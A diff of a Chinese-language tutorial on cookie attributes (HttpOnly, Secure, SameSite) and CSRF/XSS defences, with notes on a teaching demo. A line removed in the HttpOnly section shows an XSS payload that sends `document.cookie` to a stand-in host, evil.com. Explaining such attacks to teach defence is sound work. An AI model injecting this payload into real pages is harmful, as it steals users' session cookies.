@@ -22,6 +22,8 @@ Cookie: __Host-session=opaque-id
 
 前端无需、也不应读取 HttpOnly 会话 Cookie。浏览器能发送某个 Cookie，不代表服务端可以省略权限校验；服务端仍需验证会话、用户身份与资源授权。
 
+“自动发送”仍受请求配置约束。例如 fetch 的 credentials 默认是 same-origin，跨源请求设置 include 也不能绕过 SameSite 或第三方 Cookie 策略。Cookie 是否携带与响应能否被脚本读取是不同问题；CORS 报错不能单独证明服务端没收到请求。[Request.credentials](https://developer.mozilla.org/en-US/docs/Web/API/Request/credentials)
+
 ## 2. 属性总览
 
 | 属性          | 主要语义                                                   |
@@ -43,7 +45,7 @@ Cookie: __Host-session=opaque-id
 
 ### HttpOnly：防 XSS 窃取
 
-脚本能通过 `document.cookie` 读取所有非 HttpOnly 的 Cookie。反射型或存储型 XSS 一旦执行，`new Image().src = "https://evil.com/?c=" + document.cookie` 就能把会话标识外传。
+脚本可通过 document.cookie 读取当前文档可见且非 HttpOnly 的 Cookie，仍受 domain、path 及存储策略等条件约束，并非浏览器中的全部 Cookie。反射型或存储型 XSS 执行后，可能读取其中的会话标识并向外发送；能否外传还受 CSP 等条件影响。[document.cookie 文档](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)
 
 `HttpOnly` 让会话 Cookie 对脚本不可见，直接切断这条窃取路径。但它只防"读"不防"用"：若 XSS 已能在页面中执行，攻击者仍可借用户现有会话在同源内发起请求（此时 Cookie 照常附带）。因此 HttpOnly 需与 CSP、输入输出转义、敏感操作二次校验等纵深防护配合，详见 [MDN：XSS](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)。
 
@@ -51,24 +53,24 @@ Cookie: __Host-session=opaque-id
 
 带 `Secure` 的 Cookie 只在安全通道（HTTPS）上发送，避免会话在 HTTP 明文传输或降级请求中被网络中间人截获。`SameSite=None` 必须同时设置 `Secure`，否则现代浏览器会拒绝写入。
 
-> 本地开发例外：localhost 属于安全上下文，Chrome/Firefox 允许通过 `http://localhost` 设置和发送 `Secure` Cookie，Safari 更严格。生产环境必须全程 HTTPS，不要依赖该特例。
+> 本地开发时，浏览器可对 localhost 的 Secure Cookie 放宽 HTTPS 要求，但本地安全上下文判定与 Cookie 实现策略不能直接画等号。当前 demo 使用 HTTP localhost，先检查目标浏览器是否实际接受并携带该 Cookie；生产部署使用 HTTPS，不依赖本地例外。[Set-Cookie 文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie)
 
 ### SameSite：防跨站携带（CSRF）
 
 CSRF 的前提是：受害浏览器向目标站点发请求时自动附带会话 Cookie，攻击者站点借这道"自动附带"伪造用户操作。`SameSite` 从源头限制跨站请求是否携带：
 
-| 取值     | 跨站行为                                                                            |
-| -------- | ----------------------------------------------------------------------------------- |
-| `Strict` | 完全不随跨站请求发送                                                                |
-| `Lax`    | 只随顶级导航的安全方法（GET 等）发送；跨站 POST 表单和 img/fetch 等子资源一律不携带 |
-| `None`   | 不做限制，跨站照常携带，必须配合 `Secure`                                           |
+| 取值     | 跨站行为                                                                                |
+| -------- | --------------------------------------------------------------------------------------- |
+| `Strict` | 完全不随跨站请求发送                                                                    |
+| `Lax`    | 只随顶级导航的安全方法（GET 等）发送；跨站 POST 表单和 img/fetch 等子资源一律不携带     |
+| `None`   | 不因 SameSite 限制跨站携带，必须配合 Secure；仍受匹配、请求配置及第三方 Cookie 策略约束 |
 
-Lax 保留顶级 GET 导航是有意取舍：保证用户从外站点链接跳转过来仍是登录态。代价是，如果服务端在 GET 上做状态变更，Lax 也拦不住。完整 CSRF 攻击面见 [MDN：CSRF](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF)。
+Lax 为顶级安全方法导航保留携带 Cookie 的机会，使外站链接进入站点时可继续识别已有会话；实际是否登录还取决于 Cookie 与服务端会话状态。如果服务端在 GET 上做状态变更，Lax 不能保护这种顶级导航。完整 CSRF 攻击面见 [MDN：CSRF](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF)。
 
 关于 site 的判定，注意两点：
 
 - site 与同源策略的 origin 不是同一概念：site 由 scheme + registrable domain 决定，忽略端口。`localhost:3000` 与 `localhost:3001` 跨源但同站；而 `localhost` 与 `127.0.0.1` 是跨站的（host 不同）。
-- 未声明 SameSite 时，Chrome 自 80 起默认按 Lax 处理（并有设置后 2 分钟内允许顶级跨站 POST 的 "Lax + POST" 宽限），其他浏览器策略不一。应显式声明 SameSite，不依赖默认值。
+- 未声明 SameSite 时，部分浏览器默认采用 Lax，并可能有设置后短时间内允许顶级跨站 POST 的兼容宽限。这与显式 SameSite=Lax 不应混为一谈；应显式声明，并按目标浏览器核对默认策略。
 
 ### 攻击与防护对照
 
@@ -79,7 +81,7 @@ Lax 保留顶级 GET 导航是有意取舍：保证用户从外站点链接跳�
 | CSRF 跨站 GET  | img 子资源 / 顶级导航链接    | `SameSite=Lax`（仅拦子资源） | GET 不做状态变更 + token        |
 | 明文截获       | HTTP 传输 / 降级请求         | `Secure`                     | 全站 HTTPS、HSTS                |
 
-> 三个属性都是浏览器侧的约束：浏览器据此决定"要不要带上 Cookie"。服务端不能假设客户端一定配合——恶意客户端可以构造任意请求。SameSite 是纵深防御中的一层，CSRF token 与 Origin 校验不可省略。
+> 三个属性约束不同环节：Secure 限制传输条件，HttpOnly 限制脚本访问，SameSite 限制跨站携带。它们都不替代服务端认证与授权。采用 Cookie 认证的状态变更接口，应结合认证模型设计 CSRF token、来源校验等防护，不能仅凭 SameSite 或“响应不可跨源读取”认定没有 CSRF 风险。
 
 ## 4. Demo 核心实现
 
@@ -110,6 +112,8 @@ sendRedirect(res, "/")
 ```
 
 实际模板从 `BANK` 配置生成地址，不能只改 form 而忽略双源配置。HttpOnly 对照则在 bank 页面中运行 `document.cookie` 并回传可读结果；它限制读取，不阻止脚本发起已认证请求。预期与观察位置见走查，不把生成了表单当成转账已执行的证据。
+
+源码的 sessionOf 仅根据请求中的 sid 及其前缀选择实验变体，没有真实会话库；transfer 与 gift 分支展示教学响应或日志，没有真实转账、余额变更或持久账本。因此本 demo 能观察实际 Cookie 收发、脚本读取与服务端分支选择，不用于证明金融业务提交成功，也不是生产认证实现。两个登录变体同时改变 SameSite 与 HttpOnly，分析时按跨站请求和同源脚本读取分别归因；两者都有 Secure，不能用这组对照验证 Secure 的独立效果。
 
 ## 5. Host-only、Domain 与 Cookie prefix
 
